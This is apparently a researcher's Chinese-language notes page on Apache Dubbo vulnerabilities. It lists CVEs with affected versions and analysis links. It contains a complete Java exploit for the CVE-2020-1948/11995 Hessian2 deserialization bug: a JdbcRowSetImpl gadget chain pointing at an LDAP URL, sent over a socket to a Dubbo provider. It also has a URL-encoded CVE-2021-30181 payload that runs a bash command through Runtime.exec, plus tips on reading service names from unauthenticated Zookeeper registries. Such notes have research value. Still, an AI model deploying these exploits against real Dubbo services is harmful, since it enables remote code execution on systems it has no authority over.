# Dubbo 

>Apache Dubbo 是伪装的、轻量级的Java RPC 服务框架。[RPC服务](https://www.zhihu.com/question/25536695) 
>[默认反序列化利用之hessian2](https://www.anquanke.com/post/id/197658)

### CVE-2019-17564
>spring (spring-web（5.1.9.RELEASE）) 的httpinvoker 可能存在反序列化漏洞 [docs](https://docs.spring.io/spring-framework/docs/5.1.0.RELEASE/spring-framework-reference/integration.html#remoting-httpinvoker)

http://www.lmxspace.com/2020/02/16/Apache-Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-17564%EF%BC%89/

https://www.mi1k7ea.com/2021/07/03/%E6%B5%85%E6%9E%90Dubbo-HttpInvokerServiceExporter%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-17564%EF%BC%89/

演示：https://github.com/vulhub/vulhub/blob/master/dubbo/CVE-2019-17564/README.zh-cn.md

### CVE-2020-1948
https://www.anquanke.com/post/id/209251
```
2.7.0 <= Dubbo Version <= 2.7.6
2.6.0 <= Dubbo Version <= 2.6.7
Dubbo 所有 2.5.x 版本（官方团队目前已不支持）
```

### CVE-2020-11995

CVE-2020-1948的绕过

```
Dubbo 2.7.0 ~ 2.7.8
Dubbo 2.6.0 ~ 2.6.8
Dubbo 所有 2.5.x 版本
```

```java
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;
import marshalsec.util.Reflections;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Cleanable;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;

/**
 *  CVE-2020-1948 exp
 *  if (!RpcUtils.isGenericCall(path, getMethodName()) && !RpcUtils.isEcho(path, getMethodName())) {
 *       throw new IllegalArgumentException("Service not found:" + path + ", " + getMethodName());
 *  }
 * 下面有绕过CVE-2020-11995
 * 调用的函数名为 "$invoke"、 "$invokeAsync"、"$echo"三者之一
 */
public class GadgetsTestHessian {

    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        //todo 此处填写ldap url
        rs.setDataSourceName("ldap://127.0.0.1:43658/ExecObject");
        rs.setMatchColumn("foo");
        Reflections.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);

        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);
        EqualsBean root = new EqualsBean(ToStringBean.class, item);

        HashMap s = new HashMap<>();
        Reflections.setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null));
        Reflections.setFieldValue(s, "table", tbl);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 2);

        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

        out.writeUTF("2.0.2");
        //todo 此处填写注册中心获取到的service全限定名、版本号、方法名
        out.writeUTF("com.threedr3am.learn.server.boot.DemoService");
        out.writeUTF("1.0");
        out.writeUTF("$invoke");//CVE-2020-11995  $invoke,$invokeAsync,$echo
        //todo 方法描述不需要修改，因为此处需要指定map的payload去触发
        out.writeUTF("Ljava/util/Map;");
        out.writeObject(s);
        out.writeObject(new HashMap());

        out.flushBuffer();
        if (out instanceof Cleanable) {
            ((Cleanable) out).cleanup();
        }

        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

//todo 此处填写被攻击的dubbo服务提供者地址和端口
        Socket socket = new Socket("127.0.0.1", 12345);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }
}
```
### CVE-2021-25641
>Dubbo Provider即服务提供方默认使用dubbo协议来进行RPC通信，而dubbo协议默认是使用Hessian2序列化格式进行对象传输的,不过可以通过更改dubbo协议的第三个flag位字节来更改为使用Kryo或FST序列化格式来进行Dubbo Provider反序列化攻击从而绕过针对Hessian2反序列化相关的限制来达到RCE。

https://www.mi1k7ea.com/2021/06/30/%E6%B5%85%E6%9E%90Dubbo-KryoFST%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-25641%EF%BC%89/

```
CVE-2021-25641 利用版本需要判断

一方面dubbo-common必须<=2.7.3版本另一方面fj的版本要<=1.2.49 并且在2.7.4.1的版本中已经更新了fj版本所以不能使用(只是目前)

```
~~可以整理一个fastjson利用gadget~~

### CVE-2021-30179

分析：https://mp.weixin.qq.com/s/vHJpE2fZ8Lne-xFggoQiAg
实验：https://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247488856&idx=1&sn=ee37514a5bfbf8c35f4ec661a4c7d45a&chksm=903933a8a74ebabecaf9428995491494f20e5b24a15f8d52e79d3a9dac601620c21d097cdc1f&scene=21#wechat_redirect

```
Apache Dubbo 2.7.0 to 2.7.9
Apache Dubbo 2.6.0 to 2.6.9
Apache Dubbo all 2.5.x versions (官方已不再提供支持)

实验：https://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247488856&idx=1&sn=ee37514a5bfbf8c35f4ec661a4c7d45a&chksm=903933a8a74ebabecaf9428995491494f20e5b24a15f8d52e79d3a9dac601620c21d097cdc1f&scene=21#wechat_redirect

```
exp:https://github.com/lz2y/DubboPOC
```
Apache Dubbo默认支持泛化引用由服务端API接口暴露的所有方法，这些调用由GenericFilter处理。GenericFilter将根据客户端提供的接口名、方法名、方法参数类型列表，根据反射机制获取对应的方法，再根据客户端提供的反序列化方式将参数进行反序列化成pojo对象。

也就是说需要知道注册中心注册的接口名，方法名，才可以配合攻击。
```
也就是需要存在无授权服务注册中心比如zookeeper的无授权去获得接口名和方法名。使用工具**zookeeper-dev-ZooInspector.jar**

**个人认为CVE-2021-30179的主要思路就是Apache Dubbo在处理泛类引用时，提供了多种通过反序列化方式得到对象再生成pojo对象的选择。** 三梦师傅说跟这个思路扩大了反序列化挖掘思路

### CVE-2021-30181

https://articles.zsxq.com/id_28iczv3uhbtk.html

```exp
script%3A%2F%2F127.0.0.1%2Fcom.threedr3am.learn.server.boot.DemoService%3Fapplication%3Ddubbo-consumer%26category%3Drouters%26check%3Dfalse%26dubbo%3D2.0.2%26init%3Dfalse%26interface%3Dcom.threedr3am.learn.server.boot.DemoService%26metadata-type%3Dremote%26methods%3Dhello%26pid%3D53953%26qos.enable%3Dfalse%26release%3D2.7.7%26revision%3D1.0%26side%3Dconsumer%26sticky%3Dfalse%26timestamp%3D1622381389749%26version%3D1.0%26route%3Dscript%26type%3Djavascript%26rule%3Ds%253D%255B3%255D%253Bs%255B0%255D%253D'%252Fbin%252Fbash'%253Bs%255B1%255D%253D'-c'%253Bs%255B2%255D%253D'open%2520-a%2520calculator'%253Bjava.lang.Runtime.getRuntime().exec(s)%253B
```

### Dubbo反序列化RCE利用之新拓展面 - Dubbo Rouge攻击客户端

https://xz.aliyun.com/t/7354

**文章中有一点非常强**
![image](https://user-images.githubusercontent.com/63966847/139078049-28694796-bb21-40fe-9e8d-38d96da29ab8.png)

在一次看了threedr3am师傅的文章太精彩了，简单的说就是通过注册中心上注册恶意rpc服务并且设置序列化为java原生序列化，等待客户端去连接。
也就是**rouge**,中文名称叫胭脂，hhh 有点美人计的味道了。

### CVE-2021-43297

https://paper.seebug.org/1814/

### Dubbo 2.7.8多个远程代码执行漏洞

https://xz.aliyun.com/t/8917

### CVE-2021-36162

[Apache Dubbo CVE-2021-36162 挖掘过程
](https://mp.weixin.qq.com/s?__biz=MzkyMTI0NjA3OA==&mid=2247487450&idx=1&sn=895a573a105cff858990df8bb88aafc5&chksm=c187cfcbf6f046ddbe75a826d851ebeafbcc7449e728a6be0e3ad60279ae7689ef14d4181757&mpshare=1&scene=23&srcid=0323KHKv3qtNyGs5a4jlCoz5&sharer_sharetime=1648033016703&sharer_shareid=33fdea7abe6be586e131951d667ccd06#rd)
